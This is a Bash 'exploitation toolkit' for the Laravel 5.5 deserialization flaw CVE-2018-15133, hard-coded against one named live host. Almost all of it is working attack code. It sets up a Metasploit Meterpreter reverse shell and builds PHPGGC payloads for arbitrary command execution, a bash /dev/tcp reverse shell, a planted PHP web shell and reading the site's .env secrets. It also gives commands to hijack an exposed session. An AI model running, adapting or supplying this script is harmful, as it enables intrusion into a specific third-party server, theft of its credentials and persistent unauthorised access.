#!/bin/bash
# =============================================================================
# Laravel 5.5 Deserialization RCE - Complete Exploitation Toolkit
# Target: http://seminyak.lamanuna.biz.id:8081/lpd_seminyak/
# CVE-2018-15133
# =============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
TARGET_HOST="seminyak.lamanuna.biz.id"
TARGET_PORT="8081"
TARGET_URI="/lpd_seminyak/"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}${TARGET_URI}"

# Banner
clear
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║        Laravel 5.5 Deserialization RCE Exploitation Toolkit          ║
║        CVE-2018-15133 | Metasploit + PHPGGC + Manual Methods        ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
EOF

echo ""
echo -e "${BLUE}Target Information:${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  URL: $TARGET_URL"
echo "  Host: $TARGET_HOST"
echo "  Port: $TARGET_PORT"
echo "  Path: $TARGET_URI"
echo "  Framework: Laravel 5.5.* (Vulnerable)"
echo ""

# Function to get attacker IP
get_local_ip() {
    # Try different methods to get local IP
    local ip=$(ip route get 1 | awk '{print $7;exit}' 2>/dev/null)
    if [ -z "$ip" ]; then
        ip=$(hostname -I | awk '{print $1}' 2>/dev/null)
    fi
    if [ -z "$ip" ]; then
        ip="127.0.0.1"
    fi
    echo "$ip"
}

# Check prerequisites
check_prerequisites() {
    echo -e "${YELLOW}[*]${NC} Checking prerequisites..."
    
    local all_ok=true
    
    # Check Metasploit
    if command -v msfconsole &> /dev/null; then
        echo -e "${GREEN}[✓]${NC} Metasploit Framework found"
    else
        echo -e "${RED}[✗]${NC} Metasploit not found"
        all_ok=false
    fi
    
    # Check curl
    if command -v curl &> /dev/null; then
        echo -e "${GREEN}[✓]${NC} curl found"
    else
        echo -e "${RED}[✗]${NC} curl not found"
        all_ok=false
    fi
    
    # Check nc
    if command -v nc &> /dev/null; then
        echo -e "${GREEN}[✓]${NC} netcat found"
    else
        echo -e "${RED}[✗]${NC} netcat not found (optional)"
    fi
    
    # Check git (for PHPGGC)
    if command -v git &> /dev/null; then
        echo -e "${GREEN}[✓]${NC} git found"
    else
        echo -e "${RED}[✗]${NC} git not found (optional for PHPGGC)"
    fi
    
    echo ""
    
    if [ "$all_ok" = false ]; then
        echo -e "${RED}[!]${NC} Missing required tools. Install them first:"
        echo "  sudo apt update"
        echo "  sudo apt install metasploit-framework curl netcat git"
        echo ""
        read -p "Continue anyway? (y/n): " continue
        if [[ ! $continue =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# Method 1: Metasploit
method_metasploit() {
    echo ""
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║  METHOD 1: METASPLOIT EXPLOITATION                                ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Get LHOST
    local default_ip=$(get_local_ip)
    echo -e "${YELLOW}[*]${NC} Detected your IP: ${GREEN}$default_ip${NC}"
    read -p "Enter your IP (LHOST) [$default_ip]: " lhost
    lhost=${lhost:-$default_ip}
    
    read -p "Enter port for reverse shell [4444]: " lport
    lport=${lport:-4444}
    
    echo ""
    echo -e "${YELLOW}[*]${NC} Creating Metasploit resource script..."
    
    # Create resource script
    local rc_file="/tmp/laravel_exploit_$$.rc"
    cat > "$rc_file" << RCEOF
use exploit/unix/webapp/laravel_deserialization
set RHOSTS $TARGET_HOST
set RPORT $TARGET_PORT
set TARGETURI $TARGET_URI
set SSL false
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
set VERBOSE true
show options
exploit -z
RCEOF
    
    echo -e "${GREEN}[✓]${NC} Resource script created: $rc_file"
    echo ""
    echo -e "${YELLOW}[*]${NC} Configuration:"
    echo "    LHOST: $lhost"
    echo "    LPORT: $lport"
    echo "    Target: $TARGET_URL"
    echo ""
    echo -e "${YELLOW}[*]${NC} Starting Metasploit..."
    echo -e "${YELLOW}[*]${NC} If successful, you'll get a Meterpreter session"
    echo ""
    sleep 2
    
    # Run Metasploit
    sudo msfconsole -q -r "$rc_file"
    
    # Cleanup
    rm -f "$rc_file"
}

# Method 2: PHPGGC
method_phpggc() {
    echo ""
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║  METHOD 2: PHPGGC EXPLOITATION                                    ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Check if PHPGGC exists
    if [ ! -d "phpggc" ]; then
        echo -e "${YELLOW}[*]${NC} PHPGGC not found. Cloning..."
        git clone https://github.com/ambionics/phpggc.git
    else
        echo -e "${GREEN}[✓]${NC} PHPGGC found"
    fi
    
    cd phpggc
    
    echo ""
    echo "Available exploitation types:"
    echo "  1. Command Execution (whoami, id, etc)"
    echo "  2. Reverse Shell"
    echo "  3. Web Shell Upload"
    echo "  4. Read .env file"
    echo "  5. Custom command"
    echo ""
    read -p "Select option [1-5]: " phpggc_option
    
    case $phpggc_option in
        1)
            read -p "Enter command to execute [whoami]: " cmd
            cmd=${cmd:-whoami}
            echo ""
            echo -e "${YELLOW}[*]${NC} Generating payload for command: $cmd"
            payload=$(./phpggc Laravel/RCE1 system "$cmd" -b)
            ;;
        2)
            local default_ip=$(get_local_ip)
            read -p "Enter your IP [$default_ip]: " rev_ip
            rev_ip=${rev_ip:-$default_ip}
            read -p "Enter port [4444]: " rev_port
            rev_port=${rev_port:-4444}
            
            echo ""
            echo -e "${YELLOW}[*]${NC} Starting netcat listener on ${rev_ip}:${rev_port}..."
            echo -e "${YELLOW}[*]${NC} Run in another terminal: nc -lvnp $rev_port"
            read -p "Press Enter when listener is ready..."
            
            local shell_cmd="bash -c 'bash -i >& /dev/tcp/${rev_ip}/${rev_port} 0>&1'"
            echo -e "${YELLOW}[*]${NC} Generating reverse shell payload..."
            payload=$(./phpggc Laravel/RCE1 system "$shell_cmd" -b)
            ;;
        3)
            echo -e "${YELLOW}[*]${NC} Generating web shell upload payload..."
            local shell_code='<?php system($_GET["cmd"]); ?>'
            payload=$(./phpggc Laravel/RCE2 file_put_contents '../public/shell.php' "$shell_code" -b)
            echo -e "${GREEN}[✓]${NC} After success, access shell at:"
            echo "    $TARGET_URL/shell.php?cmd=whoami"
            ;;
        4)
            echo -e "${YELLOW}[*]${NC} Generating .env read payload..."
            payload=$(./phpggc Laravel/RCE1 system 'cat ../.env' -b)
            ;;
        5)
            read -p "Enter custom command: " custom_cmd
            echo -e "${YELLOW}[*]${NC} Generating custom payload..."
            payload=$(./phpggc Laravel/RCE1 system "$custom_cmd" -b)
            ;;
        *)
            echo -e "${RED}[✗]${NC} Invalid option"
            cd ..
            return
            ;;
    esac
    
    echo ""
    echo -e "${YELLOW}[*]${NC} Sending payload to target..."
    echo -e "${YELLOW}[*]${NC} Cookie: laravel_session=${payload:0:50}..."
    echo ""
    
    # Send payload
    response=$(curl -s "$TARGET_URL" --cookie "laravel_session=${payload}" -w "\nHTTP_CODE:%{http_code}")
    http_code=$(echo "$response" | grep "HTTP_CODE" | cut -d: -f2)
    body=$(echo "$response" | sed '/HTTP_CODE/d')
    
    echo -e "${GREEN}[✓]${NC} Response received (HTTP $http_code)"
    echo ""
    echo "Response:"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "$body" | head -n 20
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    
    # Check for success indicators
    if echo "$body" | grep -q "uid="; then
        echo -e "${GREEN}[✓✓✓] EXPLOITATION SUCCESSFUL! [✓✓✓]${NC}"
        echo -e "${GREEN}[✓]${NC} Command execution confirmed (uid= found in response)"
    elif echo "$body" | grep -q "www-data"; then
        echo -e "${GREEN}[✓✓✓] EXPLOITATION SUCCESSFUL! [✓✓✓]${NC}"
        echo -e "${GREEN}[✓]${NC} Command execution confirmed (www-data found)"
    elif [ $phpggc_option -eq 2 ]; then
        echo -e "${YELLOW}[*]${NC} Check your netcat listener for reverse shell connection"
    else
        echo -e "${YELLOW}[*]${NC} Check response above for command output"
    fi
    
    cd ..
}

# Method 3: Manual exploitation
method_manual() {
    echo ""
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║  METHOD 3: MANUAL EXPLOITATION                                    ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo "Manual exploitation commands:"
    echo ""
    echo "1. Using curl with custom payload:"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "PAYLOAD=\$(echo 'O:40:\"Illuminate\\\Broadcasting\\\PendingBroadcast\":2:...' | base64)"
    echo "curl $TARGET_URL --cookie \"laravel_session=\${PAYLOAD}\""
    echo ""
    echo "2. Session hijacking (easier method):"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "# Download valid session"
    echo "curl $TARGET_URL/storage/framework/sessions/F1BibsBZlNtpITQMQ3dbrYBHxf8ArApk8nTgatCE"
    echo ""
    echo "# Use in browser or curl"
    echo "curl $TARGET_URL --cookie \"laravel_session=F1BibsBZlNtpITQMQ3dbrYBHxf8ArApk8nTgatCE\""
    echo ""
}

# Main menu
main_menu() {
    while true; do
        echo ""
        echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║  EXPLOITATION METHODS                                             ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "  1. Metasploit (Recommended - Full featured)"
        echo "  2. PHPGGC (Fast - Multiple options)"
        echo "  3. Manual (Show commands)"
        echo "  4. Info (Show target information)"
        echo "  5. Exit"
        echo ""
        read -p "Select method [1-5]: " choice
        
        case $choice in
            1)
                check_prerequisites
                method_metasploit
                ;;
            2)
                check_prerequisites
                method_phpggc
                ;;
            3)
                method_manual
                ;;
            4)
                echo ""
                echo -e "${BLUE}Target Information:${NC}"
                echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                echo "  URL: $TARGET_URL"
                echo "  Vulnerability: CVE-2018-15133"
                echo "  Framework: Laravel 5.5.*"
                echo "  PHP Version: 7.0.31 (EOL)"
                echo "  Exploitation: PHP Deserialization RCE"
                echo ""
                echo "Confirmed Vulnerabilities:"
                echo "  ✓ Session files exposed (11 files)"
                echo "  ✓ Log files accessible"
                echo "  ✓ Configuration files exposed"
                echo "  ✓ Deserialization vulnerability (Laravel 5.5)"
                echo ""
                ;;
            5)
                echo ""
                echo -e "${GREEN}[*]${NC} Exiting..."
                exit 0
                ;;
            *)
                echo -e "${RED}[✗]${NC} Invalid choice"
                ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

# Run main menu
main_menu
